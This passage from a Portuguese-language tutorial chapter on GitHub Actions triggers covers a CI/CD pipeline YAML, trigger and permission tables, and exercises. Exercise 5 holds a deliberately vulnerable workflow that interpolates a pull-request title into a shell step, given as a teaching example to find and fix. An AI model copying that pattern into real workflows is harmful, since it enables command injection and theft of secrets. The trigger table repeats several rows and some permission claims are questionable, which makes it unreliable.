        if: matrix.node-version == 20
        with:
          name: test-results-node20-shard${{ matrix.shard }}
          path: test-results/
          retention-days: 7

  # ============================================================
  # JOB: Integration Tests
  # ============================================================
  test-integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7
        ports:
          - 6379:6379
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run test:integration
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379

  # ============================================================
  # JOB: Security Scan
  # ============================================================
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run npm audit
        run: npm audit --audit-level=high
      - name: Run SAST scan
        uses: github/codeql-action/analyze@v3
        with:
          languages: javascript

  # ============================================================
  # JOB: Build
  # ============================================================
  build:
    needs: [lint, typecheck, test-unit, test-integration, security]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 7

  # ============================================================
  # JOB: Docker Build
  # ============================================================
  docker:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          path: dist/
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            ghcr.io/${{ github.repository }}:${{ github.sha }}
            ghcr.io/${{ github.repository }}:latest
          cache-from: type=gha
          cache-to: type=gha,mode=max

  # ============================================================
  # JOB: Deploy Staging
  # ============================================================
  deploy-staging:
    needs: [build, docker, context]
    if: >
      needs.context.outputs.should_deploy == 'true' &&
      (inputs.environment == 'staging' || inputs.environment == '')
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to staging
        run: |
          echo "Deploying ${{ github.sha }} to staging"
          echo "Version: ${{ inputs.version || 'latest' }}"
      - name: Verify deployment
        run: |
          sleep 30
          curl -f https://staging.example.com/health || exit 1

  # ============================================================
  # JOB: Deploy Production
  # ============================================================
  deploy-production:
    needs: [build, docker, context, deploy-staging]
    if: >
      needs.context.outputs.should_deploy == 'true' &&
      inputs.environment == 'production'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to production
        run: |
          echo "Deploying ${{ github.sha }} to production"
      - name: Verify deployment
        run: |
          sleep 30
          curl -f https://example.com/health || exit 1

  # ============================================================
  # JOB: Notify
  # ============================================================
  notify:
    needs: [build, docker, deploy-staging, deploy-production]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Send notification
        run: |
          echo "Pipeline completed"
          echo "Build: ${{ needs.build.result }}"
          echo "Docker: ${{ needs.docker.result }}"
          echo "Staging: ${{ needs.deploy-staging.result }}"
          echo "Production: ${{ needs.deploy-production.result }}"

  # ============================================================
  # JOB: Cleanup
  # ============================================================
  cleanup:
    needs: [notify]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Cleanup old artifacts
        uses: actions/github-script@v7
        with:
          script: |
            const artifacts = await github.rest.actions.listRepoArtifacts({
              owner: context.repo.owner,
              repo: context.repo.repo,
              per_page: 100
            });
            for (const artifact of artifacts.data.artifacts) {
              if (artifact.created_at < new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString()) {
                await github.rest.actions.deleteArtifact({
                  owner: context.repo.owner,
                  repo: context.repo.repo,
                  artifact_id: artifact.id
                });
              }
            }
```

---

## 3.14 Tabela Comparativa de Todos os Triggers

| Trigger | Branches | Paths | Types | Secrets Fork | Uso Principal |
|---|---|---|---|---|---|
| push | Sim | Sim | Nao | Sim | CI basico, deploy |
| pull_request | Sim (base) | Sim | Sim | Nao | Verificacao de PR |
| pull_request_target | Sim (base) | Sim | Sim | Sim | Workflows com secrets em forks |
| workflow_dispatch | Nao | Nao | Nao | Sim | Deploy manual |
| schedule | Nao | Nao | Nao | Sim | Manutencao, backups |
| repository_dispatch | Nao | Nao | Nao | Sim | Integracao externa |
| workflow_run | Nao | Nao | Sim | Sim | Encadeamento |
| release | Nao | Nao | Sim | Sim | Publicacao de pacotes |
| issue_comment | Nao | Nao | Sim | Parcial | Bots, moderacao |
| discussion_comment | Nao | Nao | Sim | Parcial | Moderacao de discussions |
| issues | Nao | Nao | Sim | Sim | Gestao de issues |
| create | Nao | Nao | Nao | Sim | Branch/tag criada |
| delete | Nao | Nao | Nao | Sim | Branch/tag deletada |
| fork | Nao | Nao | Nao | Sim | Notificacao de fork |
| gollum | Nao | Nao | Nao | Sim | Wiki editada |
| installation | Nao | Nao | Sim | Sim | App instalada |
| installation_repositories | Nao | Nao | Sim | Sim | Repositorios de app |
| label | Nao | Nao | Sim | Sim | Label criada/editada/deletada |
| milestone | Nao | Nao | Sim | Sim | Milestone criada/editada |
| page_build | Nao | Nao | Nao | Sim | GitHub Pages build |
| project | Nao | Nao | Sim | Sim | Projeto criado/editado |
| project_card | Nao | Nao | Sim | Sim | Card de projeto |
| project_column | Nao | Nao | Sim | Sim | Coluna de projeto |
| public | Nao | Nao | Nao | Sim | Repo tornado publico |
| pull_request_review | Nao | Nao | Sim | Sim | Review de PR |
| pull_request_review_comment | Nao | Nao | Sim | Sim | Comentario em review |
| pull_request_target | Sim (base) | Sim | Sim | Sim | PR com contexto do base |
| registry_package | Nao | Nao | Sim | Sim | Pacote publicado |
| repository_dispatch | Nao | Nao | Nao | Sim | Custom via API |
| security_advisory | Nao | Nao | Sim | Sim | Advisory de seguranca |
| star | Nao | Nao | Sim | Sim | Repo estrelado |
| watch | Nao | Nao | Sim | Sim | Repo watchado |
| workflow_dispatch | Nao | Nao | Nao | Sim | Manual |
| workflow_run | Nao | Nao | Sim | Sim | Apos workflow anterior |
| workflow_call | Nao | Nao | Nao | Sim | Workflow reutilizavel |

### Detalhes de Permissoes por Trigger

| Trigger | Contents | Packages | Issues | PRs | Actions | Secrets |
|---|---|---|---|---|---|---|
| push | read | write | write | write | write | Sim |
| pull_request | read | read | write | write | read | Nao |
| pull_request_target | write | write | write | write | write | Sim |
| workflow_dispatch | read | write | write | write | write | Sim |
| schedule | read | write | write | write | write | Sim |
| release | write | write | write | write | write | Sim |

### Quando Usar Cada Trigger

| Cenario | Trigger Recomendado |
|---|---|
| CI basico (build + test) | push + pull_request |
| Deploy automatico apos merge | push (branches: [main]) |
| Deploy manual | workflow_dispatch |
| Build noturno | schedule |
| Publicar pacote | release |
| Bot de comentarios | issue_comment |
| Integracao com Jenkins/GitLab | repository_dispatch |
| Deploy apos security scan | workflow_run |
| PR de forks com secrets | pull_request_target (com cautela) |

---

## 3.15 Exercicios

### Exercicio 1: Workflow Multi-Trigger

**Objetivo**: Configure um workflow que responda a tres eventos
diferentes com comportamento especifico para cada um.

**Instrucoes**:
1. Crie um workflow que rode em:
   - Push para a branch main
   - PR para a branch main
   - Schedule diario as 3h UTC
   - workflow_dispatch manual
2. Para cada evento, o workflow deve:
   - Printar qual evento triggerou
   - Executar um passo diferente
   - Ter um output que identifique o contexto
3. Use um job de build e um job condicional de deploy

**Verificacao**: O workflow deve rodar em todos os 4 eventos e
executar o deploy apenas quando apropriado.

### Exercicio 2: Workflow Dispatch com Inputs

**Objetivo**: Implemente um workflow_dispatch com validacao de inputs.

**Instrucoes**:
1. Crie um workflow com os seguintes inputs:
   - `environment` (choice): dev, staging, production
   - `version` (string): tag ou branch
   - `dry_run` (boolean): simulacao
   - `notify` (boolean): enviar notificacao
2. Implemente validacao:
   - Se environment for production, exija confirmacao
   - Validate que a versao existe no repositorio
   - Se dry_run for true, pule o deploy real
3. Use o GitHub CLI para triggerar o workflow

**Verificacao**: Teste com entradas validas e invalidas. Valide que
a validacao funciona corretamente.

### Exercicio 3: Pipeline Encadeada com workflow_run

**Objetivo**: Crie uma pipeline de 3 workflows encadeados.

**Instrucoes**:
1. Workflow A (Build): build e upload de artefatos
2. Workflow B (Test): roda apos Build completar, baixa artefatos e roda testes
3. Workflow C (Deploy): roda apos Test completar com sucesso
4. Cada workflow deve:
   - Verificar a conclusao do anterior
   - Acessar dados do workflow anterior
   - Implementar tratamento de erros
5. Implemente notificacao em caso de falha

**Verificacao**: A pipeline completa deve executar em sequencia
e parar em caso de falha.

### Exercicio 4: Bot de Deploy por Comentario

**Objetivo**: Implemente um bot que responda a comandos em comentarios.

**Instrucoes**:
1. Crie um workflow com trigger `issue_comment`
2. Implemente os seguintes comandos:
   - `/deploy staging`: deploy para staging
   - `/deploy production`: deploy para producao (requer confirmacao)
   - `/rollback <version>`: rollback para versao anterior
   - `/status`: mostrar status do ultimo deploy
3. Implemente seguranca:
   - Verifique `author_association` para comandos perigosos
   - Valide comandos antes de executar
   - Implemente rate limiting
4. Adicione reactions no comentario para indicar progresso

**Verificacao**: Teste todos os comandos e valide que a seguranca
funciona (comando de usuario nao autorizado deve ser ignorado).

### Exercicio 5: Event Injection Protection

**Objetivo**: Identifique e corrija vulnerabilidades de event injection.

**Instrucoes**:
1. Analise este workflow vulneravel e identifique todos os pontos
   de event injection:

```yaml
name: Vulnerable

on:
  pull_request:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - run: echo "PR: ${{ github.event.pull_request.title }}"
      - run: echo "Author: ${{ github.event.pull_request.user.login }}"
      - run: |
          TITLE="${{ github.event.pull_request.title }}"
          echo "Processing: $TITLE"
```

2. Reescreva o workflow para ser seguro
3. Implemente validacao de dados
4. Adicione testes para payloads maliciosos

**Verificacao**: O workflow corrigido deve:
- Usar variaveis de ambiente em vez de interpolar diretamente
- Validar dados antes de usar
- Nao ser vulneravel a injeção de comandos

### Exercicio 6: Repository Dispatch com Sistema Externo

**Objetivo**: Implemente integracao com um sistema externo via
repository_dispatch.

**Instrucoes**:
1. Crie um workflow que aceite repository_dispatch
2. Implemente os seguintes tipos:
   - `deploy`: deploy de uma versao especifica
   - `rollback`: rollback para versao anterior
   - `scale`: escalar numero de replicas
3. Crie um script que triggera o workflow via API
4. Implemente validacao do payload
5. Adicione logging para auditoria

**Verificacao**: Teste o workflow com a API e valide que todos
os tipos funcionam corretamente.

### Exercicio 7: Schedule com Timezone

**Objetivo**: Configure um schedule que funcione corretamente
considerando diferencas de timezone.

**Instrucoes**:
1. Calcule o equivalente UTC para:
   - 02:00 BRT (Brasilia)
   - 09:00 EST (Nova York)
   - 17:00 JST (Tokyo)
2. Configure um workflow com schedules para esses horarios
3. Implemente um relatorio que mostre:
   - Horario UTC da execucao
   - Horario local equivalente
   - Dados do commit mais recente
4. Adicione notificacao via Slack

**Verificacao**: O workflow deve executar nos horarios corretos
e o relatorio deve mostrar os horarios corretos.

---

## 3.16 Referencias

### Documentacao Oficial

1. **GitHub Actions Documentation - Events that trigger workflows**
   https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows
   Referencia completa de todos os eventos suportados pelo GitHub Actions,
   incluindo exemplos e restricoes de cada um.

2. **GitHub Actions Workflow Syntax - on**
   https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_target
   Sintaxe completa do campo `on` e todos os triggers disponiveis.

3. **Security Hardening for GitHub Actions**
   https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
   Guia de seguranca para workflows, incluindo event injection,
   permissions, e secrets management.

4. **Using Workflows from Restricted Packages**
   https://docs.github.com/en/actions/security-for-github-actions/using-workflows/using-workflows-from-restricted-packages
   Como restringir a origem de workflows para mejorar seguranca.

5. **Events API - Repository Dispatch**
   https://docs.github.com/en/rest/repos/repos?apiVersion=2022-11-28#create-a-repository-dispatch-event
   Documentacao da API para repository_dispatch.

6. **Crontab Guru**
   https://crontab.guru/
   Ferramenta util para testar e validar expressoes cron.

7. **GitHub Actions Security Log**
   https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-the-audit-log-to-monitor-workflow-activities
   Como monitorar atividade de workflows para auditoria de seguranca.

### Artigos e Tutoriais

8. **Understanding the GitHub Actions Context**
   https://docs.github.com/en/actions/learn-github-actions/contexts
   Documentacao completa de todos os contextos disponiveis
   durante a execucao de workflows.

9. **GitHub Actions Concurrency**
   https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#concurrency
   Como controlar execucoes concorrentes de workflows.

10. **GitHub Actions Environments**
    https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment
    Como usar environments para proteger deploys criticos.

---

## Resumo do Capitulo

Neste capitulo, cobrimos todos os aspectos dos triggers e eventos
do GitHub Actions:

- **Event Lifecycle**: O fluxo completo de como um evento chega ao
  seu workflow, desde a origem ate a execucao
- **Push**: Filtragem por branches, tags, paths e combinacoes
- **Pull Request**: Types, seguranca, pull_request_target vs
  pull_request
- **Workflow Dispatch**: Inputs, API, GitHub CLI, seguranca
- **Schedule**: Sintaxe cron, timezones, limitacoes
- **Repository Dispatch**: API, payload, integracao externa
- **Workflow Run**: Encadeamento, acessando dados anteriores
- **Release**: Types, publicacao, integracao com registries
- **Issue/Discussion Comment**: Bots, seguranca, moderacao
- **Combining Triggers**: OR, AND, condicoes complexas
- **Seguranca**: Event injection, prevencoes, checklist

O proximo capitulo abordara os runners e ambientes de execucao,
onde voce aprendera a configurar e otimizar os runners para seus
workflows.
---

*[Capítulo anterior: 02 — Syntax Workflows](02-syntax-workflows.md)*
*[Próximo capítulo: 04 — Build Test](04-build-test.md)*
